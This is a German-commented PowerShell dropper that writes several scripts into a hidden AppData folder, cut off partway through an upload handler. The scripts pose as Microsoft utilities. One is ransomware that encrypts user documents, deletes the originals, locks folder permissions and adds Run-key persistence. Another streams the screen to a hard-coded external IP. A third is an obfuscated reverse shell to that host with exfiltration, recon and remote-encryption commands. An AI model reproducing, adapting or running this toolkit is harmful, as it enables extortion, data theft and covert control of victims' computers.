Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# TLS 1.2 für GitHub
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

# ==================== NEUER TEIL: ORDNER ERSTELLEN UND SCRIPTS DROPPEN ====================
# Zielordner (dynamisch für aktuellen User)
$basePowerShellFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell"
$operationsFolder = Join-Path $basePowerShellFolder "operations"
#$flagFilePath = Join-Path $targetFolder "operator_initialized.flag"
$targetFolder = Join-Path $operationsFolder "System"
$ceasarScriptPath = Join-Path $targetFolder "WindowsCeasar.ps1"
$operatorScriptPath = Join-Path $targetFolder "WindowsOperator.ps1"
$transmitterScriptPath = Join-Path $targetFolder "WindowsTransmitter.ps1"
$systemScriptPath = Join-Path $targetFolder "System.ps1"
$microsoftViewSScriptPath = Join-Path $targetFolder "MicrosoftViewS.ps1"

# Inhalt des WindowsCeasar.ps1 als Multi-Line-String
$ceasarScriptContent = @'
# Microsoft Windows File Protection Utility - Secure File Management for Windows (Modes: Full/Select)
# Usage: .\WindowsCeasar.ps1 -ProtectFull -Key <password> or -RestoreFull -Key <password> or -ProtectSelect <path> -Key <password> or -RestoreSelect <path> -Key <password>
# Auto-Update: -EnableAutoUpdate -Key <password> (installs as User-Level Registry-Run-Key, calls Full with Key)
# Utilizes AES-CBC with PKCS7-Padding for secure file handling, with specific error handling for integrity checks (incorrect Key).
param (
    [switch]$ProtectFull,
    [switch]$RestoreFull,
    [string]$ProtectSelect,
    [string]$RestoreSelect,
    [switch]$EnableAutoUpdate,
    [string]$Key = "test" # Default for compatibility, but recommended: Always specify a unique Key
)
if ($Key -eq "test") {
    Write-Output "Warning: Default Key 'test' in use – For optimal security, provide a unique Key!"
}
$FullPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\AppData\Roaming",
    "C:\Users\Public\Documents"
) # Standard user directories for Full mode
$FilePatternsProtect = @("*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*password*", "*pass*", "*flag*", "*ctf*", "*credit*", "*bank*", "*customer*", "*kunden*")
$FilePatternsRestore = @("*.enc") # For restoration, search for .enc files
$ExcludeExtensions = @(".lnk", ".sys", ".dll", ".exe", ".ps1") # Exclusions for system files
# Function: Generate Key from Password (AES-256, PBKDF2 with random Salt)
function Get-AesKey {
    param ([string]$Pass, [byte[]]$Salt = $null)
    if ($null -eq $Salt) {
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $Salt = New-Object byte[] 16
        $rng.GetBytes($Salt)
    }
    $KeyDerive = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($Pass, $Salt, 100000) # Increased iterations
    $Key = $KeyDerive.GetBytes(32)
    return $Key, $Salt # Return Key and Salt (Salt is prepended)
}
# Function: Protect File (AES-CBC with PKCS7-Padding)
function Protect-File {
    param ([string]$FilePath, [string]$Pass)
    try {
        $FilePath = (Resolve-Path $FilePath -ErrorAction Stop).Path # Always use absolute path
        $Key, $Salt = Get-AesKey $Pass
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Key = $Key
        $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $IV = New-Object byte[] 16
        $rng.GetBytes($IV)
        $Aes.IV = $IV
        $Protector = $Aes.CreateEncryptor()
        $FileStream = [System.IO.File]::OpenRead($FilePath)
        $MemoryStream = New-Object System.IO.MemoryStream
        $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $Protector, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $FileStream.CopyTo($CryptoStream)
        $CryptoStream.FlushFinalBlock()
        $ProtectedBytes = $MemoryStream.ToArray()
        if ($ProtectedBytes.Length % 16 -ne 0) {
            throw "Internal Error: Protected content has invalid length ($($ProtectedBytes.Length) Bytes) – should be multiple of 16."
        }
        $ProtectedData = $Salt + $IV + $ProtectedBytes # Prepend Salt + IV
        $ProtPath = "$FilePath.enc"
        [System.IO.File]::WriteAllBytes($ProtPath, $ProtectedData)
        $FileStream.Close()
        $CryptoStream.Close()
        $MemoryStream.Close()
        Remove-Item $FilePath
        Write-Output "Protected: $FilePath -> $ProtPath (Original Size: $($FileStream.Length) Bytes, Protected: $($ProtectedBytes.Length) Bytes, Total: $($ProtectedData.Length) Bytes)"
    } catch {
        Write-Output "Error protecting ${FilePath}: $_"
    }
}
# Function: Restore File (AES-CBC with PKCS7-Padding, with Integrity Check Handling)
function Restore-File {
    param ([string]$FilePath, [string]$Pass)
    try {
        $FilePath = (Resolve-Path $FilePath -ErrorAction Stop).Path # Always use absolute path
        if ($FilePath -notlike "*.enc") { return }
        $ProtectedData = [System.IO.File]::ReadAllBytes($FilePath)
        Write-Verbose "Total size of enc file: $($ProtectedData.Length) Bytes"
        if ($ProtectedData.Length -lt 32) {
            throw "The protected file is too small (less than 32 Bytes). It may not be properly protected or corrupt."
        }
        $Salt = $ProtectedData[0..15]
        $IV = $ProtectedData[16..31]
        $CipherText = $ProtectedData[32..($ProtectedData.Length - 1)]
        Write-Verbose "Ciphertext Size: $($CipherText.Length) Bytes"
        if ($CipherText.Length % 16 -ne 0) {
            throw "Corrupt protected file: Ciphertext length ($($CipherText.Length) Bytes) is not a multiple of 16 Bytes."
        }
        $Key, $null = Get-AesKey $Pass $Salt
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Key = $Key
        $Aes.IV = $IV
        $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $Restorer = $Aes.CreateDecryptor()
        $MemoryStream = New-Object System.IO.MemoryStream($CipherText, 0, $CipherText.Length)
        $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $Restorer, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $RestoredStream = New-Object System.IO.MemoryStream
        $CryptoStream.CopyTo($RestoredStream)
        $RestoredBytes = $RestoredStream.ToArray()
        $OriginalPath = $FilePath -replace ".enc$", ""
        [System.IO.File]::WriteAllBytes($OriginalPath, $RestoredBytes)
        $CryptoStream.Close()
        $MemoryStream.Close()
        $RestoredStream.Close()
        Remove-Item $FilePath
        Write-Output "Restored: $OriginalPath (Restored Size: $($RestoredBytes.Length) Bytes)"
    } catch [System.Security.Cryptography.CryptographicException] {
        if ($_.Exception.Message -like "*Padding*") {
            Write-Output "Error restoring ${FilePath}: Incorrect Key (Integrity check failed)."
        } else {
            Write-Output "Error restoring ${FilePath}: $_ (Incorrect Key or corrupt file?)"
        }
    } catch {
        Write-Output "Error restoring ${FilePath}: $_ (Incorrect Key or corrupt file?)"
    }
}
# Function: Set Folder Permissions (Deny Read for Users Group (SID), Grant Full for current User)
function Secure-Folder {
    param ([string]$Path, [switch]$Secure)
    try {
        $Path = (Resolve-Path $Path -ErrorAction Stop).Path # Absolute path
        $acl = Get-Acl $Path
        if ($Secure) {
            # Deny Read for Users Group (SID S-1-5-32-545, language-independent)
            $denyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("S-1-5-32-545", "Read", "ContainerInherit,ObjectInherit", "None", "Deny")
            $acl.AddAccessRule($denyRule)
            # Grant Full for current User
            $grantRule = New-Object System.Security.AccessControl.FileSystemAccessRule($env:USERNAME, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
            $acl.AddAccessRule($grantRule)
            # Remove Inheritance
            $acl.SetAccessRuleProtection($true, $false)
        } else {
            # Reset to inherited
            $acl.SetAccessRuleProtection($false, $true)
        }
        Set-Acl -Path $Path -AclObject $acl
        Write-Output "Folder secured/reset: $Path"
    } catch {
        Write-Output "Error setting permissions for ${Path}: $_ (Insufficient user rights? Ignoring for utility purposes.)"
    }
}
# Function: Scan and Process Directory (recursive)
function Process-Path {
    param ([string]$Path, [switch]$IsProtect, [string]$Pass)
    $Path = (Resolve-Path $Path -ErrorAction Stop).Path # Absolute path
    if (Test-Path $Path) {
        $patterns = if ($IsProtect) { $FilePatternsProtect } else { $FilePatternsRestore }
        $files = Get-ChildItem -Path $Path -Recurse -Include $patterns -File | Where-Object { $_.Extension -notin $ExcludeExtensions }
        foreach ($file in $files) {
            if ($IsProtect) {
                if ($file.FullName -notlike "*.enc") { Protect-File $file.FullName $Pass }
            } else {
                Restore-File $file.FullName $Pass
            }
        }
        # Recursively set permissions on subdirectories
        Get-ChildItem -Path $Path -Recurse -Directory | ForEach-Object {
            Secure-Folder -Path $_.FullName -Secure:$IsProtect
        }
        Secure-Folder -Path $Path -Secure:$IsProtect
    } else {
        Write-Output "Path not found: $Path"
    }
}
# Auto-Update: Install as User-Level Registry-Run-Key (calls Full mode with Key)
if ($EnableAutoUpdate) {
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $TaskName = "MicrosoftFileProtector"
    $ScriptPath = $PSScriptRoot + "\WindowsCeasar.ps1"
    $Value = "powershell.exe -ExecutionPolicy Bypass -Command `"& { Start-Sleep -Seconds 60; . $ScriptPath -ProtectFull -Key '$Key' }`""
    Set-ItemProperty -Path $RegPath -Name $TaskName -Value $Value
    Write-Output "Auto-Update enabled: Registry Key '$TaskName' runs at login (User-Level, Full mode with Key '$Key')."
    exit
}
# Main Logic (Pass Key to Process-Path)
if ($ProtectFull) {
    foreach ($path in $FullPaths) { Process-Path -Path $path -IsProtect -Pass $Key }
} elseif ($RestoreFull) {
    foreach ($path in $FullPaths) { Process-Path -Path $path -Pass $Key }
} elseif ($ProtectSelect) {
    Process-Path -Path $ProtectSelect -IsProtect -Pass $Key
} elseif ($RestoreSelect) {
    Process-Path -Path $RestoreSelect -Pass $Key
} else {
    Write-Output "Usage: -ProtectFull -Key <pass> or -RestoreFull -Key <pass> or -ProtectSelect <path> -Key <pass> or -RestoreSelect <path> -Key <pass> or -EnableAutoUpdate -Key <pass>."
}
'@

# Inhalt des WindowsOperator.ps1 als Multi-Line-String
$operatorScriptContent = @'
# Microsoft Windows PowerShell Operator Script
# This script manages PowerShell operations for system maintenance and updates.
# It ensures necessary files are in place and configures startup for seamless operation.

# Environment variables and paths
$appDataPath = 'APPDATA'
$microsoftWindowsPowerShellPath = 'Microsoft\Windows\PowerShell'
$operationFolder = 'operation'
$dateTimeFormat = 'yyyy-MM-dd HH:mm:ss'
$registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$operatorKeyName = 'WinOperator'
$powerShellExe = 'powershell.exe'
$hiddenExecutionArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -File'
$screenStreamScript = 'ScreenStream.ps1'
$arg14 = '-a14'
$ipAddress = '145.223.117.77'
$arg15 = '-a15'
$port = '8080'
$arg16 = '-a16'
$interval = '20'
$arg17 = '-a17'
$quality = '70'
$ps1Filter = '*.ps1'
$hiddenAttribute = 'Hidden'
$systemSubfolder = 'System'  # Subfolder for organized system files

# Get current script path and directory
$scriptPath = $MyInvocation.MyCommand.Path
$scriptDir = Split-Path -Path $scriptPath -Parent
$scriptName = Split-Path -Path $scriptPath -Leaf

# Construct destination paths
$baseDir = Join-Path -Path $(Get-Content Env:$appDataPath) -ChildPath $microsoftWindowsPowerShellPath
$hiddenDir = Join-Path -Path $baseDir -ChildPath $operationFolder
$systemDir = Join-Path -Path $hiddenDir -ChildPath $systemSubfolder  # System subfolder for deeper nesting
$destScript = Join-Path -Path $systemDir -ChildPath $scriptName

# Check if script is not already in destination
if ($scriptPath -ne $destScript) {
    try {
        # Create base directory if it doesn't exist
        if (-not (Test-Path $baseDir)) {
            New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
        }
        
        # Create and hide operation directory
        if (-not (Test-Path $hiddenDir)) {
            New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
            $folder = Get-Item $hiddenDir -Force
            $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::$hiddenAttribute
        }
        
        # Create and hide system subfolder
        if (-not (Test-Path $systemDir)) {
            New-Item -Path $systemDir -ItemType Directory -Force | Out-Null
            $sysFolder = Get-Item $systemDir -Force
            $sysFolder.Attributes = $sysFolder.Attributes -bor [System.IO.FileAttributes]::$hiddenAttribute
        }
        
        # Copy all .ps1 files to system directory
        $psFiles = Get-ChildItem -Path $scriptDir -Filter $ps1Filter -File
        foreach ($file in $psFiles) {
            $destFile = Join-Path -Path $systemDir -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destFile -Force -ErrorAction Stop
        }
        
        # Clean up old VBS startup if exists
        $startupDir = Join-Path -Path $(Get-Content Env:$appDataPath) -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup"
        $vbsPath = Join-Path -Path $startupDir -ChildPath "WinOp.vbs"
        if (Test-Path $vbsPath) {
            Remove-Item -Path $vbsPath -Force | Out-Null
        }
        
        # Set registry for persistence
        $runValue = "$powerShellExe $hiddenExecutionArgs `"$destScript`""
        Set-ItemProperty -Path $registryPath -Name $operatorKeyName -Value $runValue -Force | Out-Null
    } catch {
        # Graceful exit on error
        return
    }
    
    # Start other .ps1 scripts from system directory
    $otherPsFiles = Get-ChildItem -Path $systemDir -Filter $ps1Filter -File | Where-Object { $_.Name -ne $scriptName }
    foreach ($file in $otherPsFiles) {
        $otherScript = $file.FullName
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$otherScript`"" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
    
    # Start ScreenStream.ps1 if exists in system directory
    $screenStreamPath = Join-Path -Path $systemDir -ChildPath $screenStreamScript
    if (Test-Path $screenStreamPath) {
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$screenStreamPath`" $arg14 `"$ipAddress`" $arg15 $port $arg16 $interval $arg17 $quality" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
} else {
    # If already in destination, start other scripts
    $otherPsFiles = Get-ChildItem -Path $systemDir -Filter $ps1Filter -File | Where-Object { $_.Name -ne $scriptName }
    foreach ($file in $otherPsFiles) {
        $otherScript = $file.FullName
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$otherScript`"" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
    
    # Start ScreenStream.ps1 if exists
    $screenStreamPath = Join-Path -Path $systemDir -ChildPath $screenStreamScript
    if (Test-Path $screenStreamPath) {
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$screenStreamPath`" $arg14 `"$ipAddress`" $arg15 $port $arg16 $interval $arg17 $quality" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
}

# End of Microsoft Windows PowerShell Operator Script
'@

# Inhalt des WindowsTransmitter.ps1 als Multi-Line-String
$transmitterScriptContent = @'
# Obfuskierter PowerShell-Reverse-Shell (verbessert für leiseren Recon, mit Prompt-Fix)
# Alle IPs, Ports, Pfade obfuskiert durch Concatenation.
# Funktionsnamen geändert zu randomisierten (z.B. FnGk1, FnTd2, FnRe3).
# Variablennamen randomisiert (z.B. vDh für DOWNLOAD_HOST, vCk für CurrentKey etc.).
# Änderungen: Initialer Enum entfernt; Recon in dedizierte Befehle geklustert; Help aktualisiert; Prompt dynamisch nach jedem Befehl.

$a = '145'; $b = '223'; $c = '117'; $d = '77'; $obfIp = $a + '.' + $b + '.' + $c + '.' + $d
$pDl = [int]('4'+'4'+'4'+'4')
$pUl = [int]('4'+'4'+'4'+'5')
$pMn = [int]('4'+'4'+'3')
$hdP1 = 'Micro'; $hdP2 = 'soft'; $hdP3 = '\Win'; $hdP4 = 'dows\Power'; $hdP5 = 'Shell\oper'; $hdP6 = 'ation'
$vHd = Join-Path -Path $env:APPDATA -ChildPath ($hdP1 + $hdP2 + $hdP3 + $hdP4 + $hdP5 + $hdP6)
$esP1 = '\Docu'; $esP2 = 'ments\Win'; $esP3 = 'dowsCea'; $esP4 = 'sar.ps1'
$vEs = "$env:USERPROFILE" + $esP1 + $esP2 + $esP3 + $esP4
$vCk = 't' + 'e' + 's' + 't'

function FnGk1 {
    param ([string]$p1, [byte[]]$s1)
    $kd = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($p1, $s1, 100000)
    $k = $kd.GetBytes(32)
    return $k
}

function FnTd2 {
    param ([string]$fp, [string]$p1 = $vCk)
    try {
        $fp = (Resolve-Path $fp -ErrorAction Stop).Path
        if ($fp -notlike '*.enc') { return $fp }
        $ed = [System.IO.File]::ReadAllBytes($fp)
        if ($ed.Length -lt 32) { throw 'Datei zu klein.' }
        $s1 = $ed[0..15]
        $iv = $ed[16..31]
        $ct = $ed[32..($ed.Length - 1)]
        $k = FnGk1 $p1 $s1
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $k
        $aes.IV = $iv
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $dec = $aes.CreateDecryptor()
        $ms = New-Object System.IO.MemoryStream($ct, 0, $ct.Length)
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $dec, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $ds = New-Object System.IO.MemoryStream
        $cs.CopyTo($ds)
        $db = $ds.ToArray()
        $tp = Join-Path -Path $env:TEMP -ChildPath ([System.IO.Path]::GetRandomFileName())
        [System.IO.File]::WriteAllBytes($tp, $db)
        $cs.Close(); $ms.Close(); $ds.Close()
        return $tp
    } catch {
        throw "Entschlüsselungsfehler: $_"
    }
}

function FnRe3 {
    param ([string]$tp, [string]$oep, [string]$p1 = $vCk)
    try {
        $oep = (Resolve-Path $oep -ErrorAction Stop).Path
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $s1 = New-Object byte[] 16; $rng.GetBytes($s1)
        $k = FnGk1 $p1 $s1
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $k
        $iv = New-Object byte[] 16; $rng.GetBytes($iv)
        $aes.IV = $iv
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $enc = $aes.CreateEncryptor()
        $fs = [System.IO.File]::OpenRead($tp)
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $enc, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $fs.CopyTo($cs)
        $cs.FlushFinalBlock()
        $eb = $ms.ToArray()
        $ed = $s1 + $iv + $eb
        [System.IO.File]::WriteAllBytes($oep, $ed)
        $fs.Close(); $cs.Close(); $ms.Close()
        Remove-Item $tp -Force
    } catch {
        throw "Verschlüsselungsfehler: $_"
    }
}

$vDh = $obfIp
$vDp = $pDl
$vUh = $obfIp
$vUp = $pUl

while ($true) {
    try {
        $vCl = New-Object System.Net.Sockets.TCPClient($obfIp, $pMn)
        $vSt = $vCl.GetStream()
        $vWr = New-Object System.IO.StreamWriter($vSt)
        $vRd = New-Object System.IO.StreamReader($vSt)
        $vWr.AutoFlush = $true
        $vWr.WriteLine("--- Shell verbunden ---")
        $vPm = "PS " + (Get-Location).Path + "> "  # Initialer Prompt
        $vWr.Write($vPm)
        while ($vCl.Connected) {
            $vCm = $vRd.ReadLine()
            if ($vCm -eq $null -or $vCm.ToLower() -eq "exit") { break }
            $vOt = ""
            try {
                if ($vCm.ToLower() -eq "help" -or $vCm.ToLower() -eq "-h") {
                    $vOt = @"
Verfuegbare Befehle in dieser Reverse-Shell:
Befehl | Syntax / Beispiel | Beschreibung
----------------------- | -------------------------------------------------------- | ------------
help / -h | help | Zeigt diese Hilfe an
cd | cd <Pfad> (z.B. cd C:\Users) | Wechselt das Verzeichnis (absolut/relativ); cd ohne Pfad -> Userprofile
cat | cat <Datei> [<key>] (z.B. cat flag.txt MeinKey) | Liest den Inhalt einer Datei und sendet ihn zeilenweise (Textdateien, temporaer entschlÃ¼sselt falls noetig mit Key; Fallback: CurrentKey/test)
download | download <Datei> [<key>] (z.B. download C:\secret.exe MeinKey) | Laedt jede Datei (Text/Binaer) chunked & base64-encodiert herunter (temporaer entschlÃ¼sselt falls noetig mit Key; Fallback: CurrentKey/test)
upload | upload <Zielpfad> (z.B. upload "$vHd\news.ps1")| Lädt Datei vom Attacker hoch (chunked). Starte auf Attacker: python upload_server.py local.ps1. Bei .ps1 im operation-Ordner automatisch hidden gestartet.
execute | execute <Dateipfad> (z.B. execute test.ps1) | Führt .ps1-Datei asynchron aus (im Hintergrund, ohne zu blocken) mit -NoProfile -NonInteractive -ExecutionPolicy Bypass.
search_sensitive | search_sensitive [<Pfad>] | Sucht rekursiv nach sensiblen Dateien (Docs, Excel, Passwoerter, Flags etc.) und sendet Inhalte im Klartext (Textdateien) oder via Download (Binaer). Optional: Startpfad (Default: Userprofile + Documents)
encrypt_full <key> | encrypt_full MeinKey | Verschluesselt alle user-Ordner (Full-Modus, mit Key; setzt CurrentKey)
decrypt_full <key> | decrypt_full MeinKey | Entschluesselt alle user-Ordner (Full-Modus, mit Key)
encrypt_select <path> <key> | encrypt_select C:\Users\adsfa\Downloads MeinKey | Verschluesselt einen spezifischen Ordner (Select-Modus, mit Key; setzt CurrentKey)
decrypt_select <path> <key> | decrypt_select C:\Users\adsfa\Downloads MeinKey | Entschluesselt einen spezifischen Ordner (Select-Modus, mit Key)
recon_system [-Verbose] | recon_system | Sammelt System-Infos (Hostname, OS, Laufwerke, Prozesse, Software)
recon_user [-Verbose] | recon_user | Sammelt Benutzer-Infos (User, Profile, Konten, E-Mail/Pass-Hinweise)
recon_network [-Verbose] | recon_network | Sammelt Netzwerk-Infos (IPs, Adapter, Gateway, ARP, WLAN)
recon_geolocation [-Verbose] | recon_geolocation | Sammelt Geolocation-Infos (Public IP, Geo-Daten – erfordert Internet)
recon_privesc [-Verbose] | recon_privesc | Sammelt Privesc-Checks (Privilegien, Patches, ACLs, Vektoren)
recon_all [-Verbose] | recon_all | Führt alle Recon-Cluster aus (Voll-Enum, aber on-demand)
exit | exit | Beendet die Shell sauber (keine Wiederverbindung)
Andere Befehle | <beliebiger PowerShell-Befehl> (z.B. whoami, dir) | Fuehrt normale PowerShell-Befehle aus
Tipp: Verwende Anfuehrungszeichen bei Pfaden mit Leerzeichen. Für upload .ps1 in "$vHd\" wird es automatisch hidden gestartet. CurrentKey: $vCk (letzter encrypt-Key). Bei falschem Key bei cat/download wirft es Padding-Fehler.
"@
                } elseif ($vCm -like "recon_system*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### System-Infos`n"
                    $vEo += "Hostname: " + $env:COMPUTERNAME + "`n"
                    $vEo += "OS-Version: " + (Get-WmiObject Win32_OperatingSystem).Caption + " (Build: " + (Get-WmiObject Win32_OperatingSystem).BuildNumber + ")`n"
                    $vEo += "Architektur: " + $env:PROCESSOR_ARCHITECTURE + "`n"
                    $vEo += "Timezone/Location-Hinweis: " + [System.TimeZoneInfo]::Local.DisplayName + "`n"
                    $vEo += "Aktuelles Verzeichnis: " + (Get-Location).Path + "`n"
                    $vEo += "Verfuegbare Laufwerke: " + (Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free | Out-String) + "`n"
                    $vEo += "Laufende Prozesse (Top 10): " + (Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Out-String) + "`n"
                    $vEo += "Installierte Software (High-Level): " + (Get-WmiObject Win32_Product | Select-Object Name, Version | Out-String) + "`n"
                    if ($vVb) { $vEo += "`nVerbose: System-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_user*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Benutzer-Infos`n"
                    $vEo += "Aktueller Benutzer: " + $env:USERNAME + "`n"
                    $vEo += "Vollstaendiger Name: " + (Get-WmiObject Win32_UserAccount -Filter "Name='$env:USERNAME'").FullName + "`n"
                    $vEo += "User-Profile-Pfad: " + $env:USERPROFILE + "`n"
                    $vEo += "Andere lokale User-Konten: " + (Get-LocalUser | Select-Object Name, Enabled, LastLogon | Out-String) + "`n"
                    try {
                        $eh = if (Test-Path "$env:USERPROFILE\AppData\Local\Microsoft\Outlook") { "Outlook-Profil vorhanden" } else { "Keine Outlook-Profile gefunden" }
                        $vEo += "E-Mail-Hinweise: " + $eh + "`n"
                    } catch {
                        $vEo += "E-Mail-Hinweise: Fehler: $_`n"
                    }
                    $vEo += "Passwort-Hinweise: Keine direkten Passwoerter (Admin-Rechte fuer SAM-Dump benoetigt). Ueberpruefe Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`n"
                    if ($vVb) { $vEo += "`nVerbose: User-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_network*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Netzwerk-Infos`n"
                    $vEo += "Interne IP-Adressen: " + (Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, AddressFamily | Out-String) + "`n"
                    $vEo += "Netzwerk-Adapter (WLAN/LAN): " + (Get-NetAdapter | Select-Object Name, Status, MacAddress, MediaType | Out-String) + "`n"
                    $vEo += "Gateway/DNS: " + (Get-NetRoute -AddressFamily IPv4 | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' } | Select-Object NextHop | Out-String) + "DNS: " + (Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses | Out-String) + "`n"
                    $vEo += "Andere Geraete im Netzwerk (ARP-Tabelle): " + (Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State | Out-String) + "`n"
                    $vEo += "Verbundene WLAN-Netzwerke: " + (netsh wlan show profiles | Out-String) + "`n"
                    if ($vVb) { $vEo += "`nVerbose: Network-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_geolocation*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Geolocation-Infos`n"
                    try {
                        $pip = Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 5 | Select-Object -ExpandProperty Content
                        $vEo += "Public IP: $pip`n"
                        $gr = Invoke-WebRequest -Uri "https://ipinfo.io/$pip/json" -TimeoutSec 5
                        $gj = $gr.Content | ConvertFrom-Json
                        $vEo += "Geodaten:`n"
                        $vEo += " - Stadt: " + $gj.city + "`n"
                        $vEo += " - Region: " + $gj.region + "`n"
                        $vEo += " - Land: " + $gj.country + "`n"
                        $vEo += " - Postleitzahl: " + $gj.postal + "`n"
                        $vEo += " - Breitengrad/Laengengrad: " + $gj.loc + "`n"
                        $vEo += " - Timezone: " + $gj.timezone + "`n"
                        $vEo += " - ISP: " + $gj.org + "`n"
                        $vEo += " - Hostname: " + $gj.hostname + "`n"
                    } catch {
                        $vEo += "Geodaten: Konnte nicht abgerufen werden (Fehler: $_)`n"
                    }
                    if ($vVb) { $vEo += "`nVerbose: Geolocation-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_privesc*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Privilege Escalation Checks`n"
                    try {
                        $vEo += "Aktuelle Privilegien: " + (whoami /priv | Out-String) + "`n"
                        $vEo += "Systeminfo (fuer Patches/Hotfixes): " + (systeminfo | Select-String "Hotfix|OS Name|OS Version|System Type" | Out-String) + "`n"
                        $sv = Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -notlike '"*"' -and $_.PathName -like '* *' }
                        if ($sv) {
                            $vEo += "Dienste mit unquoted Paths: " + ($sv | Select-Object Name, PathName | Out-String) + "`n"
                        } else {
                            $vEo += "Keine unquoted Service Paths gefunden.`n"
                        }
                        $wp = @("C:\Windows", "C:\Windows\System32", "HKLM:\SOFTWARE")
                        foreach ($p in $wp) {
                            try {
                                $acl = Get-Acl $p
                                $vEo += "Zugriffsrechte fuer ${p}: " + ($acl.Access | Where-Object { $_.IdentityReference -like "*$env:USERNAME*" -and $_.AccessControlType -eq "Allow" -and $_.FileSystemRights -match "Write|Modify|FullControl" } | Out-String) + "`n"
                            } catch {
                                $vEo += "Fehler bei ACL-Check fuer ${p}: $_`n"
                            }
                        }
                        $vEo += "Potenzielle Privesc-Vektoren:`n - SeImpersonatePrivilege? -> JuicyPotato.`n - Unpatched? -> MS17-010 etc.`n - Writable Services? -> sc.exe qc.`n"
                    } catch {
                        $vEo += "Fehler bei Privesc-Checks: $_`n"
                    }
                    if ($vVb) { $vEo += "`nVerbose: Privesc-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_all*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vOt = Invoke-Expression "recon_system $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_user $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_network $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_geolocation $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_privesc $(if($vVb){'-Verbose'})" + "`n"
                    if ($vVb) { $vOt += "`nVerbose: Full Recon abgeschlossen.`n" }
                } elseif ($vCm -like "upload *") {
                    $vRp = $vCm.Substring(7).Trim()
                    if ([string]::IsNullOrWhiteSpace($vRp)) {
                        $vOt = "Verwendung: upload <Zielpfad-auf-Target>"
                    } else {
                        try {
                            $vDr = Split-Path $vRp -Parent
                            if ($vDr -and -not (Test-Path $vDr)) { New-Item -ItemType Directory -Force -Path $vDr | Out-Null }
                            $vUc = New-Object System.Net.Sockets.TCPClient($vUh, $vUp)
                            $vUs = $vUc.GetStream()
                            $vUw = New-Object System.IO.StreamWriter($vUs)
                            $vUr = New-Object System.IO.StreamReader($vUs)
                            $vUw.AutoFlush = $true
